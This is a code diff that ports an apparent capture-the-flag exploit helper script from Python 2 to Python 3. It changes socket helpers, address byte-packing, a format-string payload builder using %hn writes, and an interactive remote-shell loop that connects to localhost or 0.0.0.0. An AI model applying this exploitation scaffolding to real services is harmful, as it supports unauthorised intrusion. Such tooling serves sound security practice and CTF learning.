@@ -3,45 +3,52 @@ from socket import *
 import time
 
 
-def addr2s(x):
-	res = ""
-	for i in xrange(size_t):
-		res += chr(x % 256)
-		x /= 256
+def addr2b(x):
+	res = b""
+	for i in range(size_t):
+		res += bytes([(x % 256)])
+		x //= 256
+	#print(res)
 	return res
 
 def s2hex(s):
-	return map(lambda c: hex(ord(c)),s)
+	return list(map(lambda c: hex(ord(c)),s))
 	
-def s2addr(s):
+def b2addr(s,blen=None):
+	if blen is None:
+		blen = size_t
 	res = 0
-	for i in xrange(size_t):
+	for i in range(blen):
 		res *= 256
-		res += ord(s[size_t-i-1])
+		res += s[blen-i-1]
 	return res
 	
 def shell():
 	while True:
-		sock.send(raw_input() + '\n')
-		print sock.recv(1024)
+		sock.send((input() + '\n').encode(encoding='utf-8'))
+		print(sock.recv(128).decode('utf-8'))
 
 def getunt(c):
-	res = ""
-	while res=='' or res[-len(c):]!=c:
+	assert type(c) is bytes
+	res = b""
+	while res==b'' or res[-len(c):]!=c:
+		#print(res[-len(c):])
 		res += sock.recv(1)
-		#print res
-	print res
+		#print(res)
+	#print(res)
 	return res
 
+fp = open('i.txt','wb')
 def send(s):
 	#print '[sending :: %s]' % s
+	fp.write(s) 
 	sock.send(s)
 
 def getshellc(fn):
 	res = ""
 	with open(fn,'rb') as fp:
 		res = fp.read()
-	print map(ord,res)
+	print(map(ord,res))
 	return res
 
 
@@ -58,8 +65,8 @@ class FSB:
 		sl.head = '*' * bytm
 		#%hnでやっていきます
 		sl.yet = yet + paynum * size_t * (size_t / 2) + bytm
-		print 'yet .. ',sl.yet
-		print yet
+		print('yet .. ',sl.yet)
+		print(yet)
 		#payloadは、yetとpaynum分ずれて出る。
 		sl.data = []
 		sl.npn = 0
@@ -96,13 +103,14 @@ isgaibu = False
 
 sock = socket(AF_INET, SOCK_STREAM)
 if isgaibu:
-	sock.connect(("gaibu.sa-ba-", 10001))
-	raw_input('gdb$')
-		
+	sock.connect(("0.0.0.0", 30007))
+	#input('gdb$')
+
 else:
 	sock.connect(("localhost", 10001))
-	raw_input('gdb$')
+	#input('gdb$')
 
-size_t = 0x4 #x64かx86か。sizeof(void*) の値で。
+size_t = 0x8 #x64かx86か。sizeof(void*) の値で。
+
 
 
